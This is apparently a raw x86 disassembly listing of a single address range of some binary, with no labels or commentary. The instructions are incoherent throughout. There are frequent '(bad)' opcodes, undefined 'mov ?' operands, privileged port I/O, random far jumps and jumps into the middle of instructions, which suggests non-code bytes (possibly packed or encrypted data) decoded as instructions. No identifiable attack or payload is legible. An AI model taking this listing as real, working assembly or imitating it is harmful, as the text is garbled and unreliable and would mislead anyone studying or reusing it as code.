  414ba2:	adc    BYTE PTR [esi+eiz*4-0x56058dde],bl
  414ba9:	icebp  
  414baa:	aam    0x6d
  414bac:	in     al,dx
  414bad:	pop    eax
  414bae:	outs   dx,DWORD PTR ds:[esi]
  414baf:	(bad)  
  414bb0:	ins    BYTE PTR es:[edi],dx
  414bb1:	aaa    
  414bb2:	aaa    
  414bb3:	jbe    0x414bb4
  414bb5:	ins    BYTE PTR es:[edi],dx
  414bb6:	dec    edi
  414bb7:	mov    cl,0x6
  414bb9:	out    0xb2,eax
  414bbb:	push   edi
  414bbc:	mov    esp,DWORD PTR [ebx+esi*8]
  414bbf:	sub    ch,BYTE PTR [ebp+0x18]
  414bc2:	add    eax,0x8b219237
  414bc7:	push   ebx
  414bc8:	rcr    DWORD PTR [ebx-0x350f7150],0x2
  414bcf:	and    BYTE PTR [ebx+0x7f],ch
  414bd2:	daa    
  414bd3:	add    eax,0x51065187
  414bd8:	sbb    BYTE PTR [ecx-0x78dd6540],cl
  414bde:	pop    esp
  414bdf:	popa   
  414be0:	mov    cl,dl
  414be2:	mov    al,0xf6
  414be4:	dec    esi
  414be5:	enter  0x3085,0xd2
  414be9:	pop    ebx
  414bea:	push   ebx
  414beb:	xor    BYTE PTR [ebx],ch
  414bed:	out    0xa6,eax
  414bef:	test   eax,0xb42caab7
  414bf4:	inc    ecx
  414bf5:	es leave 
  414bf7:	(bad)  
  414bf8:	jecxz  0x414bea
  414bfa:	inc    ebp
  414bfb:	ds adc al,0x63
  414bfe:	inc    esp
  414bff:	scas   al,BYTE PTR es:[edi]
  414c00:	imul   bx,WORD PTR [ecx],0xfecc
  414c05:	frstor [ebp+0x5df2e04d]
  414c0b:	out    dx,eax
  414c0c:	test   al,0x20
  414c0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c0f:	loop   0x414c20
  414c11:	dec    DWORD PTR [ebx]
  414c13:	mov    DWORD PTR [edi+0x74],ecx
  414c16:	mov    bh,0xb3
  414c18:	repz hlt 
  414c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c1b:	dec    esi
  414c1c:	and    eax,0x1bc1affc
  414c21:	add    eax,0xeed4e987
  414c26:	jns    0x414c35
  414c28:	shl    BYTE PTR [esi+0x23],1
  414c2b:	mov    edx,0xf93b5738
  414c30:	sub    edi,ebx
  414c32:	pop    esi
  414c33:	sbb    al,0x9e
  414c35:	adc    esi,ebp
  414c37:	mov    al,0x8e
  414c39:	cwde   
  414c3a:	test   al,0xd0
  414c3c:	mov    bl,BYTE PTR [eax-0x31]
  414c3f:	inc    esi
  414c40:	jg     0x414bea
  414c42:	not    BYTE PTR [ebp-0x1c7f4040]
  414c48:	mov    ebp,0xa9558899
  414c4d:	rcl    DWORD PTR [ebp+esi*4-0x7a07e2fa],1
  414c54:	ds pop es
  414c56:	aam    0x61
  414c58:	adc    esi,0x2c7f9b48
  414c5e:	push   0x97434cf5
  414c63:	cdq    
  414c64:	xchg   edx,eax
  414c65:	adc    BYTE PTR [edi],bl
  414c67:	jle    0x414bee
  414c69:	mov    ch,0x90
  414c6b:	mov    esi,0xffb2b9a7
  414c70:	jle    0x414c79
  414c72:	in     al,0x90
  414c74:	mov    gs,WORD PTR [ecx+0x34]
  414c77:	jae    0x414c7b
  414c79:	cs cdq 
  414c7b:	mov    ebx,0x425c25ff
  414c80:	fidivr WORD PTR [ebp-0x40]
  414c83:	jo     0x414c1b
  414c85:	jmp    0xda4951df
  414c8a:	cmp    DWORD PTR [esi+0x2e],edi
  414c8d:	add    al,0xaa
  414c8f:	stc    
  414c90:	repnz out 0x21,eax
  414c93:	jmp    0x523d4d2c
  414c98:	sub    BYTE PTR [ebp+0x4f2f7bc3],0xbd
  414c9f:	jecxz  0x414c50
  414ca1:	loop   0x414ccd
  414ca3:	push   es
  414ca4:	cmp    esp,DWORD PTR [esi-0x5f667d39]
  414caa:	xor    al,al
  414cac:	and    edi,ecx
  414cae:	add    esi,DWORD PTR [ebp-0x7ad3ad07]
  414cb4:	jns    0x414ccd
  414cb6:	mov    esi,0xb0d471d2
  414cbb:	push   0xa6bcc8f
  414cc0:	test   al,0x8d
  414cc2:	call   0xeb02:0xf2052803
  414cc9:	pop    esi
  414cca:	jecxz  0x414cf7
  414ccc:	idiv   BYTE PTR [edi+esi*8]
  414ccf:	addr16 lock int3 
  414cd2:	divps  xmm7,XMMWORD PTR [ecx-0x2a]
  414cd6:	jl     0x414d21
  414cd8:	push   edi
  414cd9:	or     eax,0x41d8df96
  414cde:	add    ebx,esp
  414ce0:	or     BYTE PTR es:[ebx],al
  414ce3:	ret    
  414ce4:	mov    al,ds:0xb4b24564
  414ce9:	(bad)  
  414cea:	sbb    DWORD PTR [ebp-0x11ce9f44],eax
  414cf0:	or     cl,ch
  414cf2:	outs   dx,DWORD PTR gs:[esi]
  414cf4:	(bad)  
  414cf5:	xor    dh,bl
  414cf7:	outs   dx,DWORD PTR ds:[esi]
  414cf8:	stos   DWORD PTR es:[edi],eax
  414cf9:	sub    bh,BYTE PTR [edx]
  414cfb:	lods   eax,DWORD PTR ds:[esi]
  414cfc:	dec    esp
  414cfd:	push   ss
  414cfe:	(bad)  
  414cff:	fstp   TBYTE PTR [edx+ebp*2]
  414d02:	gs das 
  414d04:	push   cs
  414d05:	xor    edx,DWORD PTR [esi]
  414d07:	cmp    dh,BYTE PTR [edx]
  414d09:	jg     0x414d3b
  414d0b:	xor    eax,0x3103eb64
  414d10:	rol    BYTE PTR [edx-0x8],1
  414d13:	jl     0x414cf5
  414d15:	jmp    0x414caa
  414d17:	shl    dh,1
  414d19:	xchg   edx,esi
  414d1b:	adc    edi,DWORD PTR [ebp+0x29]
  414d1e:	mov    bl,0x8b
  414d20:	pushf  
  414d21:	add    DWORD PTR [ebp+0xf03024d],0xffffffd5
  414d28:	ins    BYTE PTR es:[edi],dx
  414d29:	mov    eax,0x838d8279
  414d2e:	scas   eax,DWORD PTR es:[edi]
  414d2f:	mov    al,0xbf
  414d31:	or     eax,0x46dd4685
  414d36:	(bad)  
  414d37:	fsubr  QWORD PTR [edi+0x36]
  414d3a:	jmp    FWORD PTR [esi-0x6b6f007c]
  414d40:	sbb    DWORD PTR [esi+0x1b],eax
  414d43:	rcl    DWORD PTR ds:0xb60e547d,0x52
  414d4a:	dec    ebx
  414d4b:	xchg   BYTE PTR ds:0xc3ade6d5,bh
  414d51:	lods   eax,DWORD PTR ds:[esi]
  414d52:	sbb    eax,0x6bec5657
  414d57:	and    eax,DWORD PTR ds:0x44dac860
  414d5d:	(bad)  
  414d5e:	cmp    ah,ah
  414d60:	inc    ecx
  414d61:	cs add cl,ch
  414d64:	adc    BYTE PTR [esi-0x68],ch
  414d67:	push   ss
  414d68:	inc    edx
  414d69:	cmp    bl,0x29
  414d6c:	(bad)  
  414d6e:	daa    
  414d6f:	mov    eax,ds:0x52d6df53
  414d74:	shr    BYTE PTR [ecx-0x3e],1
  414d77:	sub    esp,DWORD PTR [esi+0x43e9a2a4]
  414d7d:	jp     0x414da7
  414d7f:	or     DWORD PTR [eax+0x6982b09d],eax
  414d85:	push   ecx
  414d86:	adc    BYTE PTR [eax],0x8a
  414d89:	mov    BYTE PTR ds:0xcf88ce69,bl
  414d8f:	outs   dx,DWORD PTR ds:[esi]
  414d90:	jmp    0xae22:0x14433f89
  414d97:	xor    DWORD PTR [ebp+eiz*1-0x5d],ebp
  414d9b:	push   ecx
  414d9c:	push   ecx
  414d9d:	and    al,bh
  414d9f:	add    BYTE PTR [ebp-0x548f020],dh
  414da5:	sbb    al,0x47
  414da7:	adc    edi,DWORD PTR [ecx]
  414da9:	mov    cl,0x5b
  414dab:	out    dx,al
  414dac:	pop    ds
  414dad:	in     eax,dx
  414dae:	add    ch,BYTE PTR [ecx-0x5d9db9c8]
  414db4:	sti    
  414db5:	jmp    0x414d8a
  414db7:	(bad)  
  414db9:	sub    ah,BYTE PTR [edx+0x8]
  414dbc:	push   eax
  414dbd:	not    BYTE PTR ds:0xdad1298b
  414dc3:	sti    
  414dc4:	in     eax,0xf5
  414dc6:	sub    ch,ch
  414dc8:	jne    0x414e24
  414dca:	pusha  
  414dcb:	ja     0x414e24
  414dcd:	add    dh,BYTE PTR [ebx-0x59]
  414dd0:	cdq    
  414dd1:	mov    edx,0x8335b0be
  414dd6:	pop    eax
  414dd7:	jge    0x414d85
  414dd9:	adc    al,0xb
  414ddb:	mov    BYTE PTR [ebp-0x3267d633],bl
  414de1:	cli    
  414de2:	ret    
  414de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414de4:	ror    BYTE PTR [edx+0x5b],0x69
  414de8:	int    0xdc
  414dea:	das    
  414deb:	inc    edi
  414dec:	in     eax,dx
  414ded:	aam    0x3
  414def:	mov    ah,0x56
  414df1:	sbb    eax,0x1903c7b4
  414df6:	jge    0x414dd6
  414df8:	ds mov dl,0x29
  414dfb:	xchg   dh,ch
  414dfd:	jbe    0x414dd8
  414dff:	mov    edi,0xd6891cec
  414e04:	mov    ah,0x61
  414e06:	popf   
  414e07:	push   ss
  414e08:	adc    BYTE PTR [ecx-0x77c3f29d],cl
  414e0e:	pusha  
  414e0f:	mov    dh,0xa
  414e11:	int    0x34
  414e13:	push   cs
  414e14:	or     al,0x26
  414e16:	cld    
  414e17:	push   es
  414e18:	pop    esi
  414e19:	imul   edi,DWORD PTR [ebx-0x2c],0xffffff93
  414e1d:	(bad)  
  414e1e:	lock sar DWORD PTR fs:[eax],cl
  414e22:	imul   ebp,DWORD PTR [esi],0x78da7915
  414e28:	leave  
  414e29:	mov    bl,0x45
  414e2b:	(bad)  
  414e2d:	out    dx,eax
  414e2e:	iret   
  414e2f:	mov    bh,BYTE PTR [ebp-0x31]
  414e32:	mov    esp,0x15123336
  414e37:	inc    ebp
  414e38:	fs mov cl,0xd7
  414e3b:	aas    
  414e3c:	stc    
  414e3d:	xor    BYTE PTR [ebp+esi*1-0x65],dh
  414e41:	(bad)  
  414e42:	mov    esp,0x770cca25
  414e47:	aaa    
  414e48:	lds    edx,FWORD PTR [ecx+0x11e889cf]
  414e4e:	jne    0x414e32
  414e50:	xchg   edx,eax
  414e51:	mov    ch,0x7d
  414e53:	popa   
  414e54:	mov    ecx,0xb3466fef
  414e59:	fcomp  DWORD PTR [edi-0x66cc9731]
  414e5f:	push   ecx
  414e60:	pop    ds
  414e61:	and    esi,DWORD PTR [ebp+0x15]
  414e64:	mov    bl,BYTE PTR [esi-0x76d28bd9]
  414e6a:	es jp  0x414e4a
  414e6d:	mov    esp,0xb6bf1a92
  414e72:	aaa    
  414e73:	mov    esp,0x89cdc3b9
  414e78:	sbb    edx,DWORD PTR [edx+0x0]
  414e7b:	xor    eax,0x974e18d5
  414e80:	shl    edi,1
  414e82:	inc    ecx
  414e83:	mov    WORD PTR [edi],ds
  414e85:	mov    eax,0x931c77bb
  414e8a:	push   esi
  414e8b:	enter  0x1d3e,0xf0
  414e8f:	jg     0x414e49
  414e91:	ja     0x414e6b
  414e93:	or     esp,0x40
  414e96:	pop    ebp
  414e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e98:	lock cli 
  414e9a:	scas   al,BYTE PTR es:[edi]
  414e9b:	stos   BYTE PTR es:[edi],al
  414e9c:	popa   
  414e9d:	add    ch,BYTE PTR [ecx+0x2c7a240f]
  414ea3:	sti    
  414ea4:	ret    
  414ea5:	mov    ecx,0x45305683
  414eaa:	or     ah,BYTE PTR [edi-0x4c3a2822]
  414eb0:	rol    DWORD PTR [ecx-0x80],0x6a
  414eb4:	repz push cs
  414eb6:	mov    bh,ch
  414eb8:	sbb    DWORD PTR ds:0xed349490,ebx
  414ebe:	retf   
  414ebf:	outs   dx,BYTE PTR ds:[esi]
  414ec0:	gs ret 0x4f4b
  414ec4:	gs fsubrp st(2),st
  414ec7:	cmp    DWORD PTR [esi],esi
  414ec9:	jmp    0x414e8e
  414ecb:	scas   al,BYTE PTR es:[edi]
  414ecc:	adc    ah,BYTE PTR [eax]
  414ece:	inc    ebx
  414ecf:	xchg   ecx,ebp
  414ed1:	(bad)  
  414ed2:	out    dx,eax
  414ed3:	jmp    0x414f12
  414ed5:	fwait
  414ed6:	call   0xe3e8:0x7cefd8d5
  414edd:	push   esi
  414ede:	inc    edi
  414edf:	xchg   ecx,eax
  414ee0:	mov    bh,0x9b
  414ee2:	jmp    0x414e6c
  414ee4:	sar    DWORD PTR [ebx+0x1b4fcf26],cl
  414eea:	push   0x868f803d
  414eef:	mov    ebp,0x62bf8727
  414ef4:	sub    DWORD PTR [edi-0x35],esp
  414ef7:	adc    al,0x7a
  414ef9:	add    bl,al
  414efb:	rcr    edx,0x6f
  414efe:	inc    eax
  414eff:	ja     0x414f07
  414f01:	ret    0x7bc5
  414f04:	jae    0x414ea0
  414f06:	or     edx,DWORD PTR [edi+0x16749977]
  414f0c:	xchg   edx,eax
  414f0d:	dec    ebx
  414f0e:	xor    eax,0x11c0568
  414f13:	add    al,0x69
  414f15:	push   0x3ee157d3
  414f1a:	loop   0x414f78
  414f1c:	retf   0xefc8
  414f1f:	xchg   ebp,eax
  414f20:	sub    al,BYTE PTR [ebx]
  414f22:	dec    ecx
  414f23:	and    esp,eax
  414f25:	(bad)  
  414f26:	fdivr  st,st(1)
  414f28:	int3   
  414f29:	outs   dx,DWORD PTR ds:[esi]
  414f2a:	mov    esi,0x1d63396e
  414f2f:	mov    ecx,0xfe8f0afb
  414f34:	jmp    0x3736:0x92d5c406
  414f3b:	xor    BYTE PTR [esi-0x19bc6b7c],al
  414f41:	and    BYTE PTR [ebp-0x6e2a3539],0x49
  414f48:	fmul   DWORD PTR [eax-0x62e07660]
  414f4e:	jge    0x414f22
  414f50:	icebp  
  414f51:	repz arpl WORD PTR [edx+edi*2-0x30a35149],di
  414f59:	test   DWORD PTR [ebx],eax
  414f5b:	mul    BYTE PTR [ebx-0x52]
  414f5e:	rol    eax,cl
  414f60:	mov    ecx,0x31c8a561
  414f65:	test   BYTE PTR [edx],cl
  414f67:	call   0x9410d9c9
  414f6c:	out    dx,al
  414f6d:	pusha  
  414f6e:	in     eax,0x79
  414f70:	das    
  414f71:	mov    edi,ss
  414f73:	sahf   
  414f74:	adc    edx,DWORD PTR [esi+0x2cc226cb]
  414f7a:	pop    ecx
  414f7b:	and    al,0x44
  414f7d:	xchg   edx,eax
  414f7e:	test   esi,ecx
  414f80:	adc    eax,0xe9d4551a
  414f85:	adc    DWORD PTR [ecx-0x32badb74],edx
  414f8b:	sub    ecx,DWORD PTR [edx+0x50]
  414f8e:	inc    ecx
  414f8f:	repnz repnz xchg esp,eax
  414f92:	xchg   ecx,eax
  414f93:	stos   BYTE PTR es:[edi],al
  414f94:	cdq    
  414f95:	pop    eax
  414f96:	mov    WORD PTR [ecx+eiz*8],ss
  414f99:	bound  esp,QWORD PTR [eax+eiz*4]
  414f9c:	xor    al,0xb8
  414f9e:	dec    eax
  414f9f:	dec    edi
  414fa0:	jmp    FWORD PTR [ebx+0x47]
  414fa3:	inc    ebp
  414fa4:	and    eax,0x9659670a
  414fa9:	mov    ebp,0xbb052c2e
  414fae:	and    BYTE PTR [edi+0x71],al
  414fb1:	mov    ds:0x870e1b57,eax
  414fb6:	imul   ebx,DWORD PTR [esi-0x365177e9],0xf5ab6b1b
  414fc0:	xchg   ecx,eax
  414fc1:	xor    edi,ebx
  414fc3:	pop    edi
  414fc4:	xchg   edx,eax
  414fc5:	lea    ebx,[edi-0x730761c7]
  414fcb:	jmp    0xde69997f
  414fd0:	in     eax,0x77
  414fd2:	mov    eax,0xc0fb0f2b
  414fd7:	ds push 0xffffffb5
  414fda:	jmp    0x53ca0d26
  414fdf:	ficomp DWORD PTR [ebx]
  414fe1:	mov    ecx,0x21e5cb09
  414fe6:	out    dx,eax
  414fe7:	jnp    0x41501c
  414fe9:	mov    eax,0x75032750
  414fee:	retf   0xb45f
  414ff1:	dec    esi
  414ff2:	int    0x2d
  414ff4:	jle    0x414ffb
  414ff6:	out    0xd3,al
  414ff8:	shr    BYTE PTR [eax+0x25b91688],cl
  414ffe:	(bad)  
  414fff:	aad    0x94
  415001:	jmp    FWORD PTR [esi-0x18663948]
  415007:	shr    BYTE PTR [edi+ebp*8+0x429bce2b],cl
  41500e:	cmp    DWORD PTR [edx+0x3870ed2d],eax
  415014:	dec    ebx
  415015:	sub    ecx,edi
  415017:	ins    BYTE PTR es:[edi],dx
  415018:	cmp    ch,ch
  41501a:	sti    
  41501b:	mov    es,WORD PTR [ecx-0x2dfccb39]
  415021:	nop
  415022:	dec    ebp
  415023:	xor    BYTE PTR [ecx+0x9],0x9f
  415027:	fdivr  QWORD PTR [ebx+ebp*1]
  41502a:	inc    esp
  41502b:	out    dx,eax
  41502c:	cdq    
  41502d:	stos   BYTE PTR es:[edi],al
  41502e:	mov    ?,WORD PTR [ebx+0x441e7719]
  415034:	sar    DWORD PTR [ebp-0x1c],cl
  415037:	cmc    
  415038:	jecxz  0x41501d
  41503a:	sbb    DWORD PTR ds:0xa1a048e8,esp
  415040:	pop    esp
  415041:	repnz xchg edi,eax
  415043:	iret   
  415044:	pop    edx
  415045:	add    al,BYTE PTR [eax-0x39]
  415048:	pop    esi
  415049:	rcl    BYTE PTR gs:[ebp+0x46ca9860],0xdf
  415051:	std    
  415052:	push   0xe5873618
  415057:	ja     0x415072
  415059:	jg     0x415007
  41505b:	jmp    0x77e6d59f
  415060:	sahf   
  415061:	or     al,0x4a
  415063:	or     DWORD PTR [eax-0x47e1be3],edx
  415069:	mov    bh,0xbc
  41506b:	cwde   
  41506c:	sar    BYTE PTR [ecx-0x3f],1
  41506f:	mov    ebp,0xe6ad140f
  415074:	fcmovb st,st(6)
  415076:	inc    ebx
  415077:	sbb    BYTE PTR [edx],bh
  415079:	and    DWORD PTR [edi-0x48],0x75
  41507d:	sub    al,0xd9
  41507f:	jmp    0x58d9:0x79d6cd22
  415086:	mov    ebp,DWORD PTR [edx+ecx*4-0x43]
  41508a:	arpl   WORD PTR ds:0x42f9c69b,di
  415090:	xor    BYTE PTR cs:[ecx-0x146d1213],bh
  415097:	mov    edi,0xecabbbd7
  41509c:	push   ecx
  41509d:	mov    ah,0x73
  41509f:	cdq    
  4150a0:	js     0x4150dc
  4150a2:	loope  0x415043
  4150a4:	es test esi,ebx
  4150a7:	and    eax,DWORD PTR [esi-0x4817b13e]
  4150ad:	push   DWORD PTR [ecx]
  4150af:	cdq    
  4150b0:	jne    0x4150bd
  4150b2:	push   edx
  4150b3:	adc    esp,esp
  4150b5:	dec    ebx
  4150b6:	xor    DWORD PTR [ebx+0x50],eax
  4150b9:	sbb    eax,0xdf29b919
  4150be:	dec    ecx
  4150bf:	and    DWORD PTR [ebp+0x3bce1098],0x12
  4150c6:	rol    DWORD PTR [ecx],0x33
  4150c9:	dec    ebx
  4150ca:	loopne 0x41511e
  4150cc:	mov    al,ds:0xf7574202
  4150d1:	or     al,0xb7
  4150d3:	(bad)  
  4150d4:	push   eax
  4150d5:	xchg   edx,eax
  4150d6:	ja     0x415148
  4150d8:	or     al,BYTE PTR [eax-0x45d30bef]
  4150de:	push   ebx
  4150df:	test   esp,0x789e57da
  4150e5:	or     al,ah
  4150e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e8:	push   cs
  4150e9:	out    dx,al
  4150ea:	clc    
  4150eb:	xchg   ebp,eax
  4150ec:	leave  
  4150ed:	les    edi,FWORD PTR [edx+0x5eac05ec]
  4150f3:	shr    edi,cl
  4150f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f6:	dec    ebp
  4150f7:	add    BYTE PTR [esi-0x2f],ch
  4150fa:	sbb    al,0xc9
  4150fc:	or     edi,esp
  4150fe:	cdq    
  4150ff:	pop    es
  415100:	(bad)  
  415101:	jmp    0x51f3:0x46506e9b
  415108:	(bad)  
  415109:	mov    cl,0xb6
  41510b:	adc    bl,BYTE PTR [esi*4-0x2ce42a78]
  415112:	and    eax,0x402a407d
  415117:	mov    esp,0x9208fc2f
  41511c:	in     al,dx
  41511d:	dec    ebx
  41511e:	hlt    
  41511f:	ja     0x415118
  415121:	mov    al,0xe7
  415123:	in     eax,dx
  415124:	push   ss
  415125:	(bad)
  415128:	(bad)  
  415129:	in     al,0xa1
  41512b:	cmp    DWORD PTR [ebx+ebx*4+0x5b],ecx
  41512f:	jmp    0x4151a3
  415131:	sahf   
  415132:	pushfw 
  415134:	mov    ds:0xc0d79ca3,eax
  415139:	sub    eax,0x2f3f00b6
  41513e:	push   cs
  41513f:	and    DWORD PTR [edi+eax*8],edi
  415142:	sbb    bh,BYTE PTR [esp+ecx*2-0x548e0009]
  415149:	ror    BYTE PTR [edi+0xc963012],cl
  41514f:	and    al,0x5a
  415151:	xor    ecx,DWORD PTR [ecx+0x75]
  415154:	push   ebp
  415155:	pop    eax
  415156:	xchg   esp,eax
  415157:	mov    dh,cl
  415159:	daa    
  41515a:	mov    edx,0xf2cf8950
  41515f:	fst    QWORD PTR [edx+0xa9785a4]
  415165:	imul   ebx,DWORD PTR [edx+ecx*2+0x3189b22f],0x4580f881
  415170:	mov    ch,0x5d
  415172:	jp     0x51032378
  415178:	push   eax
  415179:	jp     0x4151f1
  41517b:	sub    BYTE PTR [esi+0x6a71350e],dh
  415181:	(bad)  
  415183:	jge    0x4151f1
  415185:	or     dh,ch
  415187:	mov    edi,DWORD PTR [ecx-0x65d82c33]
  41518d:	stos   BYTE PTR es:[edi],al
  41518e:	enter  0x6d28,0xba
  415192:	cmp    al,BYTE PTR [edi]
  415194:	xor    eax,0x68acee43
  415199:	or     eax,0x465cadd9
  41519e:	mov    edi,0x81cb1c2c
  4151a3:	pusha  
  4151a4:	loopne 0x415207
  4151a6:	mov    ch,0xa7
  4151a8:	sbb    cl,BYTE PTR [ebp+0x66f13773]
  4151ae:	sub    al,cl
  4151b0:	mov    bl,0x25
  4151b2:	ret    
  4151b3:	cmp    al,0x1a
  4151b5:	mov    ebp,0x30b735d3
  4151ba:	push   eax
  4151bb:	jmp    0xcbd3:0x994c4dff
  4151c2:	sub    DWORD PTR [edi],edx
  4151c4:	push   ds
  4151c5:	adc    ebp,ebp
  4151c7:	scas   al,BYTE PTR es:[edi]
  4151c8:	mov    edx,0xc9d72815
  4151cd:	addr16 cli 
  4151cf:	int3   
  4151d0:	call   0xf7b6f178
  4151d5:	into   
  4151d6:	xchg   ebp,eax
  4151d7:	mov    dh,0x85
  4151d9:	push   es
  4151da:	xor    DWORD PTR [ebp+0x62551100],0xc8fe5fec
  4151e4:	adc    ebx,DWORD PTR [eax+0x3a834cb2]
  4151ea:	push   ds
  4151eb:	mov    edi,0xfc10bf84
  4151f0:	mov    gs,WORD PTR [ecx-0xf93d9a9]
  4151f6:	xchg   esp,eax
  4151f7:	ret    0x50c2
  4151fa:	bound  esi,QWORD PTR [edx]
  4151fc:	add    esi,DWORD PTR [edi+0x79a3130a]
  415202:	call   0x3dc6:0x556779b9
  415209:	push   ebp
  41520a:	xor    BYTE PTR [ebp+0x58c7f77f],al
  415210:	mov    bl,0xe6
  415212:	neg    BYTE PTR [ebp+ecx*4+0x6b]
  415216:	sub    esi,DWORD PTR [esi]
  415218:	push   ebp
  415219:	outs   dx,DWORD PTR ds:[esi]
  41521a:	stos   BYTE PTR es:[edi],al
  41521b:	jmp    0x8c76bb57
  415220:	pop    edi
  415221:	ficomp DWORD PTR [edx-0xe]
  415224:	imul   esp,DWORD PTR [edi],0xe
  415227:	les    ecx,FWORD PTR [ecx]
  415229:	jecxz  0x41521a
  41522b:	fwait
  41522c:	adc    edx,eax
  41522e:	out    0xb3,al
  415230:	cmp    ch,BYTE PTR [eax+0x23]
  415233:	push   ecx
  415234:	adc    BYTE PTR [edi+0x44d05161],dl
  41523a:	dec    ebx
  41523b:	js     0x41521c
  41523d:	xchg   BYTE PTR [ebx],al
  41523f:	aad    0xea
  415241:	sbb    dh,BYTE PTR [ebp-0xd]
  415244:	dec    ebx
  415245:	sbb    DWORD PTR [esi+edx*1],eax
  415248:	dec    edi
  415249:	mov    bh,0xed
  41524b:	and    eax,0xd11c641d
  415250:	pop    ecx
  415251:	inc    ebp
  415252:	arpl   cx,ax
  415254:	movhps xmm5,QWORD PTR [edi]
  415257:	inc    eax
  415258:	daa    
  415259:	into   
  41525a:	pop    ss
  41525b:	fild   QWORD PTR [ebp+0x2fe6802c]
  415261:	inc    ebx
  415262:	pop    ecx
  415263:	add    BYTE PTR ss:[edi],ch
  415266:	int3   
  415267:	dec    edi
  415268:	jp     0x4151f4
  41526a:	(bad)  
  41526c:	jnp    0x415208
  41526e:	jg     0x4151fa
  415270:	int    0x4b
  415272:	mov    esi,0x751d7b8d
  415277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415278:	sub    BYTE PTR [ecx-0x262cb533],0xaf
  41527f:	jmp    0x2a9a3984
  415284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415285:	(bad)  
  415286:	test   dl,0x91
  415289:	imul   edi,DWORD PTR [ebp+0x470fdb6b],0xf364ccd6
  415293:	in     al,dx
  415294:	shr    BYTE PTR [esi+0x2b1175e5],0xf0
  41529b:	xchg   BYTE PTR [ebp+0x534895e8],dh
  4152a1:	in     eax,dx
  4152a2:	push   ss
  4152a3:	mov    BYTE PTR [eax+ecx*8],ch
  4152a6:	cmp    ebp,DWORD PTR [esp+edi*1-0x55198d88]
  4152ad:	cld    
  4152ae:	or     eax,0x6234ff54
  4152b3:	dec    eax
  4152b4:	dec    esp
  4152b5:	loope  0x4152bd
  4152b7:	xor    DWORD PTR [ebp+0x2c],esp
  4152ba:	sar    DWORD PTR [eax+ebx*1+0x36],cl
  4152be:	push   ss
  4152bf:	repnz imul esi,edx,0xef586e26
  4152c6:	repz mov bl,0xd8
  4152c9:	fdivr  QWORD PTR [edx-0x709f7cfb]
  4152cf:	daa    
  4152d0:	fld    TBYTE PTR ds:0xc2dcf569
  4152d6:	add    DWORD PTR [esi+0x6a],edi
  4152d9:	dec    edi
  4152da:	loopne 0x4152ce
  4152dc:	adc    DWORD PTR [eax-0x7eb91fa9],edx
  4152e2:	cwde   
  4152e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152e4:	adc    bh,BYTE PTR [eax]
  4152e6:	push   ds
  4152e7:	mov    ah,0xc0
  4152e9:	daa    
  4152ea:	lock shl cl,1
  4152ed:	fwait
  4152ee:	leave  
  4152ef:	ss popf 
  4152f1:	lahf   
  4152f2:	mov    edi,0x45bbfecc
  4152f7:	int    0x8f
  4152f9:	push   ecx
  4152fa:	add    al,0xa0
  4152fc:	mov    ds:0xf41c2b1e,eax
  415301:	add    DWORD PTR [esi-0x4d],eax
  415304:	call   0x5939:0xf9540374
  41530b:	xor    DWORD PTR [ebx],esi
  41530d:	daa    
  41530e:	rcr    BYTE PTR [edi],cl
  415310:	jmp    0xfc45:0x31f7d941
  415317:	scas   al,BYTE PTR es:[edi]
  415318:	sub    BYTE PTR [ebx+0x526d1645],dh
  41531e:	add    ch,0xbe
  415321:	iret   
  415322:	and    DWORD PTR [esi+0x8],edi
  415325:	fistp  WORD PTR [edi+ebp*1-0x235f4f6c]
  41532c:	pop    es
  41532d:	and    edi,esp
  41532f:	inc    esp
  415330:	stos   BYTE PTR es:[edi],al
  415331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415332:	xor    eax,DWORD PTR [ebx-0x32ee6b01]
  415338:	icebp  
  415339:	inc    ecx
  41533a:	jns    0x41537b
  41533c:	push   esp
  41533d:	pop    ds
  41533e:	or     al,0x24
  415340:	inc    ebp
  415341:	inc    eax
  415342:	daa    
  415343:	dec    edx
  415344:	scas   al,BYTE PTR es:[edi]
  415345:	jp     0x41530c
  415347:	js     0x41533b
  415349:	pop    ds
  41534a:	stos   DWORD PTR es:[edi],eax
  41534b:	xchg   DWORD PTR [eax],ecx
  41534d:	call   0xf42a:0x8e6b7e31
  415354:	jnp    0x4153a3
  415356:	call   0xee2e70c9
  41535b:	adc    eax,0x62bb50d8
  415360:	mov    dh,0xe4
  415362:	dec    ebp
  415363:	xchg   ebx,eax
  415364:	out    0x47,al
  415366:	aas    
  415367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415368:	adc    BYTE PTR [ebp+ebx*8-0x28],0xf8
  41536d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41536e:	sub    ah,BYTE PTR [eax+0x18a0bb85]
  415374:	(bad)  
  415375:	sbb    esi,ebx
  415377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415378:	call   0x7df3:0x5a614f03
  41537f:	pop    eax
  415380:	fcom   QWORD PTR [eax-0x2f]
  415383:	jb     0x4153fa
  415385:	sub    eax,0x3f44ff8e
  41538a:	adc    eax,0x86c77495
  41538f:	fld    st(1)
  415391:	mov    ?,ebx
  415393:	xchg   DWORD PTR [edi+esi*1-0x52c8ca02],esp
  41539a:	jno    0x41541b
  41539c:	jo     0x41535b
  41539e:	or     dh,BYTE PTR [ecx-0x57aa78f0]
  4153a4:	imul   ebx,DWORD PTR [edx+0x2c100d36],0x15
  4153ab:	xor    BYTE PTR [esi-0x158b08d1],0xb3
  4153b2:	lods   al,BYTE PTR ds:[esi]
  4153b3:	pop    edi
  4153b4:	mov    dl,0x15
  4153b6:	xchg   edi,eax
  4153b7:	stc    
  4153b8:	in     al,dx
  4153b9:	outs   dx,BYTE PTR ds:[esi]
  4153ba:	inc    ebx
  4153bb:	or     DWORD PTR [edx+0x61],eax
  4153be:	mov    bl,0x11
  4153c0:	mov    dl,0xd0
  4153c2:	(bad)  
  4153c3:	push   ebx
  4153c4:	dec    esp
